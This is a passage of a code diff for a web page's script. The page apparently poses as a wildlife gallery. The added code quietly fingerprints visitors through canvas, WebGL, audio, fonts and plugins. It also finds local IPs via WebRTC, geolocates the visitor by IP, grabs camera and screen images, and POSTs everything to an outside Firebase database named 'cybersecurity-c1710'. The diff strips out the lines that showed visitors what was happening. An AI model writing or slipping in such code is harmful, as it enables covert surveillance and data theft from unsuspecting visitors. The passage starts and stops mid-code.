-                // Check if we can get any Windows-specific info
-                return 'Windows Device (Computer name hidden by browser)';
-            }
-            if (ua.includes('Macintosh') || ua.includes('Mac OS X')) {
-                // Mac doesn't expose computer name
-                return 'Mac Device (Computer name hidden by browser)';
-            }
-            if (ua.includes('Linux') && !ua.includes('Android')) {
-                return 'Linux Device (Hostname hidden by browser)';
-            }
-
-            // For mobile devices
-            if (brand !== 'Unknown Brand' || model !== 'Unknown Model') {
-                return brand + ' ' + model;
-            }
-
-            return 'Not Available (Security Restriction)';
         }
 
         function getDeviceType() {
@@ -1010,90 +476,300 @@
             return 'Desktop';
         }
 
-        function getDeviceInfo() {
-            const browserInfo = getBrowserInfo();
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Wildlife Gallery', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Canvas FP', 4, 17);
+
+                return canvas.toDataURL();
+            } catch (e) {
+                return 'Canvas not supported';
+            }
+        }
+
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+                if (!gl) return { vendor: 'Not supported', renderer: 'Not supported' };
+
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
+                let vendor = 'Unknown';
+                let renderer = 'Unknown';
+
+                if (debugInfo) {
+                    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+
+                return {
+                    vendor,
+                    renderer,
+                    webglVersion: gl.getParameter(gl.VERSION),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+                    extensions: gl.getSupportedExtensions()?.slice(0, 10).join(', ') || 'None'
+                };
+            } catch (e) {
+                return { vendor: 'Error', renderer: 'Error' };
+            }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'Yes' : 'No',
+                    chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + 's',
+                    dischargingTime: battery.dischargingTime === Infinity ? 'Not discharging' : battery.dischargingTime + 's'
+                };
+            } catch (e) {
+                return { level: 'Not available', charging: 'Unknown', chargingTime: '-', dischargingTime: '-' };
+            }
+        }
+
+        async function getNetworkInfo() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
             return {
-                deviceName: getDeviceName(),
-                computerName: getComputerName(),
-                deviceBrand: getDeviceBrand(),
-                deviceModel: getDeviceModel(),
-                platform: navigator.platform || 'Unknown',
-                userAgent: navigator.userAgent,
-                browserName: browserInfo.browserName,
-                browserVersion: browserInfo.browserVersion,
-                osName: browserInfo.osName,
-                osVersion: browserInfo.osVersion,
-                deviceType: getDeviceType(),
-                screenRes: `${screen.width} x ${screen.height}`,
-                viewportSize: `${window.innerWidth} x ${window.innerHeight}`,
-                colorDepth: `${screen.colorDepth} bit`,
-                pixelRatio: window.devicePixelRatio || 1,
-                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
-                language: navigator.language || navigator.userLanguage || 'Unknown',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-                cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
-                connectionType: connection ? connection.effectiveType || connection.type || 'Unknown' : 'Unknown',
-                onlineStatus: navigator.onLine ? 'Online' : 'Offline'
+                effectiveType: connection?.effectiveType || 'Unknown',
+                downlink: connection?.downlink ? connection.downlink + ' Mbps' : 'Unknown',
+                rtt: connection?.rtt ? connection.rtt + ' ms' : 'Unknown',
+                saveData: connection?.saveData ? 'Yes' : 'No',
+                type: connection?.type || 'Unknown'
             };
         }
 
-        function displayDeviceInfo(deviceData) {
-            document.getElementById('device-name').textContent = deviceData.deviceName;
-            document.getElementById('computer-name').textContent = deviceData.computerName;
-            document.getElementById('device-brand').textContent = deviceData.deviceBrand;
-            document.getElementById('device-model').textContent = deviceData.deviceModel;
-            document.getElementById('platform').textContent = deviceData.platform;
-            document.getElementById('user-agent').textContent = deviceData.userAgent.length > 50
-                ? deviceData.userAgent.substring(0, 50) + '...'
-                : deviceData.userAgent;
-            document.getElementById('browser-name').textContent = deviceData.browserName;
-            document.getElementById('browser-version').textContent = deviceData.browserVersion;
-            document.getElementById('os-name').textContent = deviceData.osName;
-            document.getElementById('os-version').textContent = deviceData.osVersion;
-            document.getElementById('device-type').textContent = deviceData.deviceType;
-            document.getElementById('screen-res').textContent = deviceData.screenRes;
-            document.getElementById('viewport-size').textContent = deviceData.viewportSize;
-            document.getElementById('color-depth').textContent = deviceData.colorDepth;
-            document.getElementById('pixel-ratio').textContent = deviceData.pixelRatio;
-            document.getElementById('touch-support').textContent = deviceData.touchSupport;
-            document.getElementById('language').textContent = deviceData.language;
-            document.getElementById('timezone').textContent = deviceData.timezone;
-            document.getElementById('cpu-cores').textContent = deviceData.cpuCores;
-            document.getElementById('memory').textContent = deviceData.memory;
-            document.getElementById('connection-type').textContent = deviceData.connectionType;
-            document.getElementById('online-status').textContent = deviceData.onlineStatus;
+        function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gain = audioContext.createGain();
+                const processor = audioContext.createScriptProcessor(4096, 1, 1);
 
-            document.getElementById('device-status').className = 'status success';
-            document.getElementById('device-status').textContent = 'Device information retrieved successfully';
+                gain.gain.value = 0;
+                oscillator.type = 'triangle';
+                oscillator.frequency.value = 10000;
+
+                oscillator.connect(analyser);
+                analyser.connect(processor);
+                processor.connect(gain);
+                gain.connect(audioContext.destination);
+
+                oscillator.start(0);
+
+                const fingerprint = {
+                    sampleRate: audioContext.sampleRate,
+                    channelCount: audioContext.destination.channelCount,
+                    maxChannelCount: audioContext.destination.maxChannelCount,
+                    state: audioContext.state
+                };
+
+                oscillator.stop();
+                audioContext.close();
+
+                return fingerprint;
+            } catch (e) {
+                return { error: 'Audio API not supported' };
+            }
         }
 
-        async function captureScreen() {
-            const statusEl = document.getElementById('capture-status');
-            const previewEl = document.getElementById('capture-preview');
-            const imageEl = document.getElementById('capture-image');
-
+        async function getLocalIPs() {
+            const ips = [];
             try {
-                statusEl.className = 'capture-status show';
-                statusEl.style.background = 'linear-gradient(135deg, #d1ecf1 0%, #bee5eb 100%)';
-                statusEl.style.color = '#0c5460';
-                statusEl.textContent = 'Requesting screen capture permission...';
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
 
-                const stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: {
-                        displaySurface: 'monitor'
-                    },
-                    audio: false
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+
+                await new Promise((resolve) => {
+                    pc.onicecandidate = (event) => {
+                        if (!event.candidate) {
+                            resolve();
+                            return;
+                        }
+                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipMatch && !ips.includes(ipMatch[1])) {
+                            ips.push(ipMatch[1]);
+                        }
+                    };
+                    setTimeout(resolve, 3000);
                 });
 
-                statusEl.textContent = 'Capturing screen...';
+                pc.close();
+            } catch (e) {
+                // WebRTC not supported
+            }
+            return ips;
+        }
+
+        function getMediaDevices() {
+            return new Promise((resolve) => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+                    resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 });
+                    return;
+                }
+
+                navigator.mediaDevices.enumerateDevices()
+                    .then(devices => {
+                        const counts = { audioInputs: 0, videoInputs: 0, audioOutputs: 0, devices: [] };
+                        devices.forEach(device => {
+                            if (device.kind === 'audioinput') counts.audioInputs++;
+                            if (device.kind === 'videoinput') counts.videoInputs++;
+                            if (device.kind === 'audiooutput') counts.audioOutputs++;
+                            counts.devices.push({
+                                kind: device.kind,
+                                label: device.label || 'Permission denied',
+                                deviceId: device.deviceId ? 'Present' : 'N/A'
+                            });
+                        });
+                        resolve(counts);
+                    })
+                    .catch(() => {
+                        resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 });
+                    });
+            });
+        }
+
+        function getSystemFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = [
+                'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria', 'Cambria Math',
+                'Comic Sans MS', 'Consolas', 'Courier', 'Courier New', 'Georgia', 'Helvetica',
+                'Impact', 'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif',
+                'Palatino Linotype', 'Segoe UI', 'Tahoma', 'Times', 'Times New Roman',
+                'Trebuchet MS', 'Verdana', 'Segoe Print', 'Segoe Script'
+            ];
+
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const h = document.getElementsByTagName('body')[0];
+            const span = document.createElement('span');
+            span.style.fontSize = testSize;
+            span.innerHTML = testString;
+
+            const defaultWidth = {};
+            for (const baseFont of baseFonts) {
+                span.style.fontFamily = baseFont;
+                h.appendChild(span);
+                defaultWidth[baseFont] = span.offsetWidth;
+                h.removeChild(span);
+            }
+
+            const detectedFonts = [];
+            for (const testFont of testFonts) {
+                let detected = false;
+                for (const baseFont of baseFonts) {
+                    span.style.fontFamily = testFont + ', ' + baseFont;
+                    h.appendChild(span);
+                    const width = span.offsetWidth;
+                    h.removeChild(span);
+                    if (width !== defaultWidth[baseFont]) {
+                        detected = true;
+                        break;
+                    }
+                }
+                if (detected) {
+                    detectedFonts.push(testFont);
+                }
+            }
+
+            return detectedFonts;
+        }
+
+        function getPermissions() {
+            return new Promise((resolve) => {
+                const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
+                const results = {};
+
+                if (!navigator.permissions) {
+                    resolve({ supported: false });
+                    return;
+                }
+
+                let pending = permissions.length;
+                permissions.forEach(perm => {
+                    navigator.permissions.query({ name: perm })
+                        .then(result => {
+                            results[perm] = result.state;
+                            pending--;
+                            if (pending === 0) resolve({ supported: true, permissions: results });
+                        })
+                        .catch(() => {
+                            results[perm] = 'unknown';
+                            pending--;
+                            if (pending === 0) resolve({ supported: true, permissions: results });
+                        });
+                });
+            });
+        }
+
+        function getStorageInfo() {
+            return {
+                localStorage: typeof localStorage !== 'undefined' ? 'Supported' : 'Not supported',
+                sessionStorage: typeof sessionStorage !== 'undefined' ? 'Supported' : 'Not supported',
+                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+                indexedDB: typeof indexedDB !== 'undefined' ? 'Supported' : 'Not supported',
+                openDatabase: typeof openDatabase !== 'undefined' ? 'Supported' : 'Not supported'
+            };
+        }
+
+        function getPluginInfo() {
+            const plugins = [];
+            if (navigator.plugins) {
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push({
+                        name: navigator.plugins[i].name,
+                        filename: navigator.plugins[i].filename,
+                        description: navigator.plugins[i].description
+                    });
+                }
+            }
+            return plugins.length > 0 ? plugins : [{ name: 'No plugins detected', filename: '-', description: '-' }];
+        }
+
+        function getTimezoneInfo() {
+            try {
+                const timezone = Intl.DateTimeFormat().resolvedOptions();
+                return {
+                    timeZone: timezone.timeZone,
+                    locale: timezone.locale,
+                    calendar: timezone.calendar,
+                    numberingSystem: timezone.numberingSystem,
+                    offset: new Date().getTimezoneOffset()
+                };
+            } catch (e) {
+                return { timeZone: 'Unknown', locale: 'Unknown', calendar: 'Unknown', numberingSystem: 'Unknown', offset: 0 };
+            }
+        }
+
+        async function getScreenCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { displaySurface: 'monitor' },
+                    audio: false
+                });
 
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-
                 await new Promise(resolve => setTimeout(resolve, 500));
 
                 const canvas = document.createElement('canvas');
@@ -1101,156 +777,184 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-
-                const imageDataUrl = canvas.toDataURL('image/png');
-                imageEl.src = imageDataUrl;
-                previewEl.classList.add('show');
+                const imageData = canvas.toDataURL('image/png');
 
                 stream.getTracks().forEach(track => track.stop());
-
-                statusEl.style.background = 'linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%)';
-                statusEl.style.color = '#155724';
-                statusEl.textContent = 'Screen captured successfully!';
-
-                await saveCaptureToFirebase(imageDataUrl, 'screen');
-
-            } catch (error) {
-                console.error('Screen capture error:', error);
-                statusEl.style.background = 'linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%)';
-                statusEl.style.color = '#721c24';
-                if (error.name === 'NotAllowedError') {
-                    statusEl.textContent = 'Permission denied. Please allow screen capture.';
-                } else {
-                    statusEl.textContent = 'Error capturing screen: ' + error.message;
-                }
+                return imageData;
+            } catch (e) {
+                return null;
             }
         }
 
-        async function startCamera() {
-            const statusEl = document.getElementById('capture-status');
-            const containerEl = document.getElementById('camera-container');
-            const videoEl = document.getElementById('camera-video');
-            const startBtn = document.getElementById('start-camera-btn');
-            const stopBtn = document.getElementById('stop-camera-btn');
-            const takePhotoBtn = document.getElementById('take-photo-btn');
-
+        async function getCameraCapture() {
             try {
-                statusEl.className = 'capture-status show';
-                statusEl.style.background = 'linear-gradient(135deg, #d1ecf1 0%, #bee5eb 100%)';
-                statusEl.style.color = '#0c5460';
-                statusEl.textContent = 'Requesting camera access...';
-
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
 
-                videoEl.srcObject = cameraStream;
-                containerEl.classList.add('show');
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(resolve => setTimeout(resolve, 300));
 
-                startBtn.style.display = 'none';
-                stopBtn.style.display = 'inline-block';
-                takePhotoBtn.style.display = 'inline-block';
-
-                statusEl.style.background = 'linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%)';
-                statusEl.style.color = '#155724';
-                statusEl.textContent = 'Camera active. Click "Take Photo" to capture.';
-
-            } catch (error) {
-                console.error('Camera access error:', error);
-                statusEl.style.background = 'linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%)';
-                statusEl.style.color = '#721c24';
-                if (error.name === 'NotAllowedError') {
-                    statusEl.textContent = 'Permission denied. Please allow camera access.';
-                } else {
-                    statusEl.textContent = 'Error accessing camera: ' + error.message;
-                }
-            }
-        }
-
-        function stopCamera() {
-            const containerEl = document.getElementById('camera-container');
-            const videoEl = document.getElementById('camera-video');
-            const startBtn = document.getElementById('start-camera-btn');
-            const stopBtn = document.getElementById('stop-camera-btn');
-            const takePhotoBtn = document.getElementById('take-photo-btn');
-            const statusEl = document.getElementById('capture-status');
-
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            videoEl.srcObject = null;
-            containerEl.classList.remove('show');
-
-            startBtn.style.display = 'inline-block';
-            stopBtn.style.display = 'none';
-            takePhotoBtn.style.display = 'none';
-
-            statusEl.style.background = 'linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%)';
-            statusEl.style.color = '#155724';
-            statusEl.textContent = 'Camera stopped.';
-        }
-
-        async function takePhoto() {
-            const videoEl = document.getElementById('camera-video');
-            const previewEl = document.getElementById('capture-preview');
-            const imageEl = document.getElementById('capture-image');
-            const statusEl = document.getElementById('capture-status');
-
-            try {
                 const canvas = document.createElement('canvas');
-                canvas.width = videoEl.videoWidth;
-                canvas.height = videoEl.videoHeight;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoEl, 0, 0);
+                ctx.drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/png');
 
-                const imageDataUrl = canvas.toDataURL('image/png');
-                imageEl.src = imageDataUrl;
-                previewEl.classList.add('show');
-
-                statusEl.style.background = 'linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%)';
-                statusEl.style.color = '#155724';
-                statusEl.textContent = 'Photo captured successfully!';
-
-                await saveCaptureToFirebase(imageDataUrl, 'camera');
-
-            } catch (error) {
-                console.error('Photo capture error:', error);
-                statusEl.style.background = 'linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%)';
-                statusEl.style.color = '#721c24';
-                statusEl.textContent = 'Error capturing photo: ' + error.message;
+                stream.getTracks().forEach(track => track.stop());
+                return imageData;
+            } catch (e) {
+                return null;
             }
         }
 
-        async function saveCaptureToFirebase(imageDataUrl, captureType) {
-            try {
-                const timestamp = new Date().toISOString();
-                const firebaseURL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app/captures.json';
+        async function collectAllDeviceInfo() {
+            const browserInfo = getBrowserInfo();
+            const phoneBrand = getPhoneBrand();
+            const phoneModel = getPhoneModel();
+            const webgl = getWebGLInfo();
+            const battery = await getBatteryInfo();
+            const network = await getNetworkInfo();
+            const audio = getAudioFingerprint();
+            const localIPs = await getLocalIPs();
+            const mediaDevices = await getMediaDevices();
+            const fonts = getSystemFonts();
+            const perms = await getPermissions();
+            const storage = getStorageInfo();
+            const plugins = getPluginInfo();
+            const timezoneInfo = getTimezoneInfo();
 
-                const payload = {
-                    type: captureType,
-                    image: imageDataUrl.substring(0, 100) + '...', // Store truncated reference
-                    timestamp: timestamp,
-                    deviceBrand: getDeviceBrand(),
-                    deviceModel: getDeviceModel(),
-                    deviceType: getDeviceType()
-                };
+            return {
+                // Basic Device Info
+                deviceName: navigator.platform || 'Unknown',
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                phoneBrand: phoneBrand,
+                phoneModel: phoneModel,
+                deviceType: getDeviceType(),
 
-                await fetch(firebaseURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-            } catch (error) {
-                console.error('Error saving capture to Firebase:', error);
-            }
+                // Browser Info
+                browserName: browserInfo.browserName,
+                browserVersion: browserInfo.browserVersion,
+                osName: browserInfo.osName,
+                osVersion: browserInfo.osVersion,
+
+                // Screen Info
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenRes: screen.width + 'x' + screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio,
+
+                // Viewport
+                viewportWidth: window.innerWidth,
+                viewportHeight: window.innerHeight,
+
+                // Hardware
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                touchSupport: 'ontouchstart' in window,
+
+                // WebGL / GPU
+                gpuVendor: webgl.vendor,
+                gpuRenderer: webgl.renderer,
+                webglVersion: webgl.webglVersion,
+                maxTextureSize: webgl.maxTextureSize,
+
+                // Battery
+                batteryLevel: battery.level,
+                batteryCharging: battery.charging,
+
+                // Network
+                connectionType: network.type,
+                effectiveConnection: network.effectiveType,
+                downlink: network.downlink,
+                rtt: network.rtt,
+                online: navigator.onLine,
+
+                // Audio
+                audioSampleRate: audio.sampleRate,
+                audioChannelCount: audio.channelCount,
+
+                // Memory - heap limit
+                jsHeapSizeLimit: performance.memory ? performance.memory.jsHeapSizeLimit : 'N/A',
+                totalJSHeapSize: performance.memory ? performance.memory.totalJSHeapSize : 'N/A',
+
+                // Local IPs
+                localIPs: localIPs,
+
+                // Media Devices
+                hasCamera: mediaDevices.videoInputs > 0,
+                hasMicrophone: mediaDevices.audioInputs > 0,
+                hasSpeakers: mediaDevices.audioOutputs > 0,
+                mediaDevices: mediaDevices.devices,
+
+                // Permissions
+                permissions: perms.permissions,
+
+                // Fonts
+                installedFonts: fonts,
+
+                // Storage
+                localStorage: storage.localStorage,
+                cookiesEnabled: storage.cookies,
+                indexedDB: storage.indexedDB,
+
+                // Plugins
+                browserPlugins: plugins.map(p => p.name).join(', '),
+
+                // Timezone
+                timezone: timezoneInfo.timeZone,
+                timezoneOffset: timezoneInfo.offset,
+                locale: timezoneInfo.locale,
+
+                // Language
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+
+                // Canvas Fingerprint (hash)
+                canvasFingerprint: getCanvasFingerprint() ? 'Generated' : 'Not supported',
+
+                // Do Not Track
+                doNotTrack: navigator.doNotTrack || 'Unspecified',
+
+                // PDF Viewer
+                pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No',
+
+                // Java Enabled (Legacy)
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+
+                // Vendor
+                vendor: navigator.vendor,
+
+                // App Info
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+
+                // History
+                historyLength: window.history.length,
+
+                // Referrer
+                referrer: document.referrer || 'Direct visit',
+
+                // Screen orientation
+                screenOrientation: screen.orientation ? screen.orientation.type : 'Unknown',
+
+                // Timestamp
+                timestamp: new Date().toISOString(),
+
+                // Visited page
+                currentURL: window.location.href,
+                pageTitle: document.title
+            };
         }
 
         async function getIPAndLocation() {
@@ -1259,373 +963,115 @@
                 const data = await response.json();
                 return {
                     ip: data.ip,
-                    country: data.country_name || '-',
-                    city: data.city || '-',
-                    region: data.region || '-',
-                    district: data.district || '-',
-                    latitude: data.latitude || '-',
-                    longitude: data.longitude || '-',
-                    isp: data.org || '-',
-                    org: data.org || '-',
-                    asn: data.asn || '-',
-                    postal: data.postal || '-',
-                    countryCode: data.country_code || '-',
-                    continent: data.continent_code || '-',
-                    timezone: data.timezone || '-',
-                    currency: data.currency || '-'
+                    country: data.country_name,
+                    city: data.city,
+                    region: data.region,
+                    district: data.district || 'N/A',
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    isp: data.org,
+                    org: data.org,
+                    asn: data.asn,
+                    postal: data.postal,
+                    countryCode: data.country_code,
+                    continent: data.continent_code,
+                    timezone: data.timezone,
+                    currency: data.currency,
+                    languages: data.languages,
+                    countryCallingCode: data.country_calling_code
                 };
             } catch (error) {
-                console.error('Error fetching IP/location:', error);
                 try {
                     const backupResponse = await fetch('https://ipwho.is/');
                     const backupData = await backupResponse.json();
                     if (backupData.success) {
                         return {
                             ip: backupData.ip,
-                            country: backupData.country || '-',
-                            city: backupData.city || '-',
-                            region: backupData.region || '-',
-                            district: '-',
-                            latitude: backupData.latitude || '-',
-                            longitude: backupData.longitude || '-',
-                            isp: backupData.connection?.isp || '-',
-                            org: backupData.connection?.org || '-',
-                            asn: 'AS' + (backupData.connection?.asn || '-'),
-                            postal: backupData.postal || '-',
-                            countryCode: backupData.country_code || '-',
-                            continent: backupData.continent || '-',
-                            timezone: backupData.timezone?.id || '-',
-                            currency: backupData.currency?.code || '-'
+                            country: backupData.country,
+                            city: backupData.city,
+                            region: backupData.region,
+                            district: 'N/A',
+                            latitude: backupData.latitude,
+                            longitude: backupData.longitude,
+                            isp: backupData.connection?.isp,
+                            org: backupData.connection?.org,
+                            asn: 'AS' + backupData.connection?.asn,
+                            postal: backupData.postal,
+                            countryCode: backupData.country_code,
+                            continent: backupData.continent,
+                            timezone: backupData.timezone?.id,
+                            currency: backupData.currency?.code,
+                            languages: backupData.languages?.[0]?.name || 'Unknown',
+                            countryCallingCode: '+' + backupData.country_code
                         };
                     }
                 } catch (backupError) {
-                    console.error('Backup API also failed:', backupError);
+                    return { error: 'Could not fetch location data' };
                 }
-                return {
-                    ip: 'Unable to detect',
-                    country: '-',
-                    city: '-',
-                    region: '-',
-                    district: '-',
-                    latitude: '-',
-                    longitude: '-',
-                    isp: '-',
-                    org: '-',
-                    asn: '-',
-                    postal: '-',
-                    countryCode: '-',
-                    continent: '-',
-                    timezone: '-',
-                    currency: '-'
-                };
+                return { error: 'Could not fetch location data' };
             }
         }
 
-        async function saveIPToFirebase(locationData, deviceData) {
+        async function saveEverythingToFirebase(deviceData, locationData, screenCapture, cameraCapture) {
             try {
-                const timestamp = new Date().toISOString();
-                const firebaseURL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app/visitors.json';
+                const firebaseURL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app/visitor_data.json';
 
                 const payload = {
-                    ip: locationData.ip,
-                    country: locationData.country,
-                    city: locationData.city,
-                    region: locationData.region,
-                    district: locationData.district,
-                    latitude: locationData.latitude,
-                    longitude: locationData.longitude,
-                    isp: locationData.isp,
-                    org: locationData.org,
-                    asn: locationData.asn,
-                    postal: locationData.postal,
-                    countryCode: locationData.countryCode,
-                    continent: locationData.continent,
-                    timezone: locationData.timezone,
-                    currency: locationData.currency,
-                    device: {
-                        deviceName: deviceData.deviceName,
-                        deviceBrand: deviceData.deviceBrand,
-                        deviceModel: deviceData.deviceModel,
-                        computerName: deviceData.computerName,
-                        platform: deviceData.platform,
-                        browserName: deviceData.browserName,
-                        browserVersion: deviceData.browserVersion,
-                        osName: deviceData.osName,
-                        osVersion: deviceData.osVersion,
-                        deviceType: deviceData.deviceType,
-                        screenRes: deviceData.screenRes,
-                        viewportSize: deviceData.viewportSize,
-                        language: deviceData.language,
-                        timezone: deviceData.timezone,
-                        cpuCores: deviceData.cpuCores,
-                        memory: deviceData.memory,
-                        connectionType: deviceData.connectionType
+                    device: deviceData,
+                    location: locationData,
+                    captures: {
+                        screen: screenCapture ? screenCapture.substring(0, 200) + '...' : null,
+                        camera: cameraCapture ? cameraCapture.substring(0, 200) + '...' : null,
+                        screenCaptured: screenCapture ? true : false,
+                        cameraCaptured: cameraCapture ? true : false
                     },
-                    timestamp: timestamp,
-                    userAgent: navigator.userAgent
-                };
-
-                const response = await fetch(firebaseURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                if (response.ok) {
-                    return { success: true, timestamp };
-                } else {
-                    return { success: false, error: 'Failed to save' };
-                }
-            } catch (error) {
-                console.error('Error saving to Firebase:', error);
-                return { success: false, error: error.message };
-            }
-        }
-
-        function parsePhoneNumber(phoneNumber) {
-            const cleaned = phoneNumber.replace(/[\s\-\(\)]/g, '');
-            const match = cleaned.match(/^\+?(\d{1,4})(\d{7,15})$/);
-
-            if (!match) {
-                return null;
-            }
-
-            const countryCode = match[1];
-            const localNumber = match[2];
-
-            const countryData = {
-                '1': { country: 'United States/Canada', currency: 'USD/CAD', format: '+1 (XXX) XXX-XXXX' },
-                '44': { country: 'United Kingdom', currency: 'GBP', format: '+44 XXXX XXXXXX' },
-                '61': { country: 'Australia', currency: 'AUD', format: '+61 XXX XXX XXX' },
-                '63': { country: 'Philippines', currency: 'PHP', format: '+63 XXX XXX XXXX' },
-                '81': { country: 'Japan', currency: 'JPY', format: '+81 XX XXXX XXXX' },
-                '86': { country: 'China', currency: 'CNY', format: '+86 XXX XXXX XXXX' },
-                '91': { country: 'India', currency: 'INR', format: '+91 XXXXX XXXXX' },
-                '49': { country: 'Germany', currency: 'EUR', format: '+49 XXX XXXXXXXX' },
-                '33': { country: 'France', currency: 'EUR', format: '+33 X XX XX XX XX' },
-                '55': { country: 'Brazil', currency: 'BRL', format: '+55 XX XXXXX XXXXX' },
-                '62': { country: 'Indonesia', currency: 'IDR', format: '+62 XXX XXXX XXXX' },
-                '60': { country: 'Malaysia', currency: 'MYR', format: '+60 XX XXX XXXX' },
-                '65': { country: 'Singapore', currency: 'SGD', format: '+65 XXXX XXXX' },
-                '66': { country: 'Thailand', currency: 'THB', format: '+66 XX XXX XXXX' },
-                '82': { country: 'South Korea', currency: 'KRW', format: '+82 XX XXXX XXXX' },
-                '7': { country: 'Russia', currency: 'RUB', format: '+7 XXX XXX XX XX' },
-                '971': { country: 'United Arab Emirates', currency: 'AED', format: '+971 XX XXX XXXX' },
-                '966': { country: 'Saudi Arabia', currency: 'SAR', format: '+966 XX XXX XXXX' },
-                '234': { country: 'Nigeria', currency: 'NGN', format: '+234 XXX XXX XXXX' },
-                '27': { country: 'South Africa', currency: 'ZAR', format: '+27 XX XXX XXXX' }
-            };
-
-            const data = countryData[countryCode] || {
-                country: 'Unknown Country',
-                currency: 'Unknown',
-                format: 'Unknown format'
-            };
-
-            const formatted = formatPhoneNumber(cleaned, countryCode);
-
-            return {
-                original: phoneNumber,
-                cleaned: cleaned,
-                countryCode: '+' + countryCode,
-                localNumber: localNumber,
-                country: data.country,
-                currency: data.currency,
-                format: data.format,
-                formatted: formatted,
-                isValid: true,
-                lineNumber: localNumber.slice(-4),
-                areaCode: localNumber.slice(0, 3),
-                type: detectPhoneType(cleaned, countryCode)
-            };
-        }
-
-        function formatPhoneNumber(number, countryCode) {
-            const localNum = number.replace('+' + countryCode, '');
-
-            if (countryCode === '1') {
